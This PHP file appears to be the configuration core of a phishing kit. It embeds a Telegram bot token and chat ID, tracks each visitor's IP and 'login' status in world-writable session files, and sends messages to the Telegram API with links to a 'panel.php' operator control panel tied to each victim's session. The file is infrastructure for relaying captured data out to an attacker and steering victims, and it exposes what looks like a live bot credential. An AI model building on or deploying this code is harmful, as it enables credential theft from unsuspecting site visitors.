<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// --- Telegram ---
define('BOT_TOKEN', '8616729943:AAFaNTmOXg44gdIdOo3zCColCWticV7D38Q');
define('CHAT_ID', '-1004292886551');

// --- Sessions ---
define('SESSIONS_DIR', __DIR__ . '/sessions/');
if (!file_exists(SESSIONS_DIR)) {
    mkdir(SESSIONS_DIR, 0777, true);
    @chmod(SESSIONS_DIR, 0777);
}

function get_client_ip() {
    $ip = 'UNKNOWN';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    return $ip;
}

function get_session($sid) {
    $file = SESSIONS_DIR . md5($sid) . '.json';
    if (file_exists($file)) {
        $d = json_decode(file_get_contents($file), true);
        if (is_array($d)) return $d;
    }
    return [
        'sid' => $sid, 'ip' => get_client_ip(), 'status' => 'login',
        'redirect_url' => 'index.php', 'last_activity' => time()
    ];
}

function save_session($sid, $data) {
    $file = SESSIONS_DIR . md5($sid) . '.json';
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
    @chmod($file, 0666);
}

function sendToTelegram($message, $sid = '') {
    $token = BOT_TOKEN;
    $chat_id = CHAT_ID;
    if (empty($token) || $token == 'YOUR_BOT_TOKEN_HERE') return;

    if ($sid) {
        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $script_path = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
        $base_url = $protocol . '://' . $host . $script_path;
        $panelLink = "{$base_url}/panel.php?sid={$sid}";
        $message .= "\n\n🔧 <b>Panel:</b> <a href='{$panelLink}'>Open Control Panel</a>";
    }

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id, 'text' => $message,
        'parse_mode' => 'HTML', 'disable_web_page_preview' => true
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => http_build_query($data),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 6,
        ]);
        curl_exec($ch);
        curl_close($ch);
    } else {
        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 6
            ]
        ];
        @file_get_contents($url, false, stream_context_create($options));
    }
}

function redirect($url) {
    header("Location: " . $url);
    exit;
}
?>